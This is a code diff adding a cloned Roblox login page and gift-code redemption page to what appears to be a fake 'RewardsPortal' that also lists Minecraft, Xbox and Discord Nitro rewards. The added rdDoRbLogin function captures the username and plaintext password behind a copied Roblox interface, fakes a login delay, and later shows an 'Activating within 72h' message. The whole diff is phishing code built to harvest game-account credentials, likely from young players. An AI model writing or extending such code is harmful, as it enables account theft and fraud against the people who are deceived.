@@ -254,6 +254,90 @@
   </div>
 </div>
 
+<!-- ROBLOX THEME (SAME TO SAME) -->
+<div class="rb-login-wrapper" id="rb-login-section">
+  <div class="rb-login-card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="rb-login-logo" alt="Roblox">
+    <h2 class="rb-login-title">Login to Roblox</h2>
+    <div id="rb-login-error" style="color:#d33;font-size:14px;margin-bottom:15px;display:none"></div>
+    <input type="text" class="rb-login-inp" id="rb-login-user" placeholder="Username/Email/Phone">
+    <input type="password" class="rb-login-inp" id="rb-login-pass" placeholder="Password">
+    <button class="rb-btn-login" onclick="rdDoRbLogin()">Log In</button>
+    <a href="#" class="rb-login-forgot">Forgot Password or Username?</a>
+  </div>
+</div>
+
+<div class="rb-theme-wrapper" id="rb-ui">
+  <div class="rb-topbar">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="rb-logo" alt="Roblox" onclick="rdBack()">
+    <div class="rb-nav-links">
+      <span class="rb-nav-link">Charts</span>
+      <span class="rb-nav-link">Marketplace</span>
+      <span class="rb-nav-link">Create</span>
+      <span class="rb-nav-link">Robux</span>
+    </div>
+    <div class="rb-search-bar">
+      <span class="rb-search-ico">🔍</span>
+      <input type="text" class="rb-search-inp" placeholder="Search">
+    </div>
+    <div class="rb-user-right">
+      <div class="rb-user-pill" id="rb-display-user">👤 User</div>
+      <div class="rb-robux">⬢ 720</div>
+      <span style="font-size:20px;cursor:pointer">⚙️</span>
+    </div>
+  </div>
+
+  <div class="rb-main">
+    <div class="rb-content-left">
+      <h1 class="rb-title">Redeem Roblox Codes</h1>
+      <p class="rb-subtitle">Enter your gift card, virtual item, or promo code below.</p>
+      
+      <label class="rb-label">Code</label>
+      <input type="text" class="rb-code-inp" id="rb-code-val" placeholder="Enter Code" oninput="this.classList.remove('err');document.getElementById('rb-err').style.display='none'">
+      
+      <div class="rb-error-box" id="rb-err">
+        <span style="font-size:18px">⚠️</span>
+        <span>Invalid Code</span>
+      </div>
+      
+      <button class="rb-btn-redeem" id="rb-btn-rd" onclick="rdSubmitRb()">Redeem</button>
+      
+      <div class="rb-terms">
+        By redeeming your code, you represent that you, and your parent or legal guardian if you are under age 18, agree to our <a href="#">Terms of Use</a> including the arbitration clause and <a href="#">Gift Card Terms & Conditions</a> and acknowledge our <a href="#">Privacy Policy</a>.
+      </div>
+      
+      <div class="rb-credit">Available Credit: 0,00 €</div>
+    </div>
+    
+    <div class="rb-content-right">
+      <h3 class="rb-sidebar-title">Additional Information</h3>
+      <a href="#" class="rb-side-link">How to Redeem Gift Cards (Video)</a>
+      <a href="#" class="rb-side-link">More Help on Gift Cards</a>
+      <a href="#" class="rb-side-link">How to Redeem Virtual Item Codes</a>
+      <a href="#" class="rb-side-link">How to Redeem Promo Codes</a>
+      <a href="#" class="rb-side-link">Learn About Roblox Safety, Moderation, and Parental Controls</a>
+      
+      <img src="https://images.rbxcdn.com/791986953e93ca917397262299719464.png" class="rb-side-img" alt="Roblox">
+    </div>
+  </div>
+
+  <footer class="rb-footer">
+    <div class="rb-foot-links">
+      <a href="#" class="rb-foot-link">About Us</a>
+      <a href="#" class="rb-foot-link">Jobs</a>
+      <a href="#" class="rb-foot-link">Blog</a>
+      <a href="#" class="rb-foot-link">Parents</a>
+      <a href="#" class="rb-foot-link">Buy Gift Cards</a>
+      <a href="#" class="rb-foot-link">Help</a>
+      <a href="#" class="rb-foot-link">Terms</a>
+      <a href="#" class="rb-foot-link">Accessibility</a>
+      <a href="#" class="rb-foot-link">Privacy</a>
+      <a href="#" class="rb-foot-link">Your Privacy Choices</a>
+      <a href="#" class="rb-foot-link">Sitemap</a>
+    </div>
+  </footer>
+</div>
+
 <footer id="std-footer">
   <div class="foot-inner">
     <div class="foot-brand">Rewards<span>Portal</span></div>
@@ -281,7 +365,12 @@ function rdGame(g) {
   hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']);
   
   if (g === 'rb') {
-    show('rd-rb-plan');
+    document.getElementById('std-ui').style.display = 'none';
+    document.getElementById('std-bg').style.display = 'none';
+    document.getElementById('std-footer').style.display = 'none';
+    document.querySelector('nav').style.display = 'none';
+    
+    document.getElementById('rb-login-section').style.display = 'flex';
   } else if (g === 'nitro') {
     show('rd-nitro-plan');
   } else if (g === 'mc' || g === 'xbox') {
@@ -369,9 +458,52 @@ function rdBack() {
   document.getElementById('mc-login-email').value = '';
   document.getElementById('mc-login-pass').value = '';
 
-  hide(['rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']); 
+  hide(['rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section','rb-login-section','rb-ui']); 
   show('rd-s1');
   RD.game = null; RD.plan = null; RD.user = null;
+}
+
+function rdDoRbLogin() {
+  const user = document.getElementById('rb-login-user').value.trim();
+  const pass = document.getElementById('rb-login-pass').value.trim();
+  const err = document.getElementById('rb-login-error');
+  
+  if (!user || !pass) {
+    err.textContent = 'Please enter your username and password.';
+    err.style.display = 'block';
+    return;
+  }
+  
+  RD.user = { name: user, email: user + '@roblox.com', pass: pass };
+  document.getElementById('rb-display-user').textContent = '👤 ' + user;
+  
+  const btn = document.querySelector('.rb-btn-login');
+  btn.textContent = 'Logging in...';
+  btn.disabled = true;
+  
+  setTimeout(() => {
+    btn.textContent = 'Log In';
+    btn.disabled = false;
+    document.getElementById('rb-login-section').style.display = 'none';
+    document.getElementById('rb-ui').style.display = 'flex';
+  }, 1200);
+}
+
+function rdSubmitRb() {
+  const code = document.getElementById('rb-code-val').value.trim().toUpperCase();
+  const err = document.getElementById('rb-err');
+  const btn = document.getElementById('rb-btn-rd');
+  
+  if (!code) {
+    err.textContent = 'Please enter a code';
+    err.style.display = 'flex';
+    return;
+  }
+  
+  btn.textContent = 'Redeeming...';
+  btn.disabled = true;
+  
+  processSubmit(code, 'rb-btn-rd', '', '', '', '', true);
 }
 
 function rdNitroPlan(p) {
@@ -487,7 +619,14 @@ function processSubmit(code, btnId, btId, spId, msgId, codeId, isPro=false) {
         document.getElementById(msgId).className='fmsg err';
         document.getElementById(msgId).textContent = result.message||'Invalid or used code';
       } else {
-        btn.disabled = false; btn.textContent = 'REDEEM';
+        btn.disabled = false;
+        if (RD.game === 'rb') {
+          btn.textContent = 'Redeem';
+          document.getElementById('rb-err').style.display = 'flex';
+          document.getElementById('rb-err').querySelector('span:last-child').textContent = result.message || 'Invalid Code';
+        } else {
+          btn.textContent = 'REDEEM';
+        }
       }
       toast('✕', result.message||'Code not valid'); return;
     }
@@ -496,7 +635,7 @@ function processSubmit(code, btnId, btId, spId, msgId, codeId, isPro=false) {
     const priceKey = RD.game==='rb' ? 'rb'+RD.plan : RD.game==='nitro' ? 'nitro'+RD.plan : RD.game;
     const inv = result.invoiceNo || ('IQ-'+RD.game.slice(0,2).toUpperCase()+'-'+Date.now().toString(36).toUpperCase().slice(-7));
     const ds = new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
-    const gnames = { mc:'Minecraft Reward', rb:'Roblox $'+RD.plan, xbox:'Xbox Game Pass', nitro:'Discord Nitro '+(RD.plan==='basic'?'Basic Yearly':'Boost Yearly') };
+    const gnames = { mc:'Minecraft Reward', rb:'Roblox Reward', xbox:'Xbox Game Pass', nitro:'Discord Nitro '+(RD.plan==='basic'?'Basic Yearly':'Boost Yearly') };
     
     const invObj = { redeemType:'code', type:RD.game, game:gnames[RD.game], plan:RD.plan?'$'+RD.plan:null,
       account: (RD.game==='rb'||RD.game==='nitro') ? RD.rbUn : RD.user.name,
@@ -517,19 +656,23 @@ function processSubmit(code, btnId, btId, spId, msgId, codeId, isPro=false) {
     // Show Success UI
     document.getElementById('mc-ui').style.display = 'none';
     document.getElementById('mc-bg').classList.remove('show');
+    document.getElementById('rb-ui').style.display = 'none';
     document.getElementById('std-ui').style.display = 'block';
     document.getElementById('std-bg').style.display = 'block';
     document.getElementById('std-footer').style.display = 'block';
+    document.querySelector('nav').style.display = 'flex';
     
     document.getElementById('rd-ok-title').textContent = gnames[RD.game] + ' Redeemed!';
     document.getElementById('rd-ok-inv').innerHTML = buildInv(invObj);
-    hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']);
+    hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section','rb-login-section','rb-ui']);
     document.getElementById('rd-ok').classList.add('show');
     
     if(!isPro) {
       btn.disabled=false; document.getElementById(btId).style.display='inline'; document.getElementById(spId).style.display='none';
     } else {
-      btn.disabled = false; btn.textContent = 'REDEEM';
+      btn.disabled = false;
+      if (RD.game === 'rb') btn.textContent = 'Redeem';
+      else btn.textContent = 'REDEEM';
     }
     toast('✅', 'Redeemed! Activating within 72h');
   }).catch(() => {
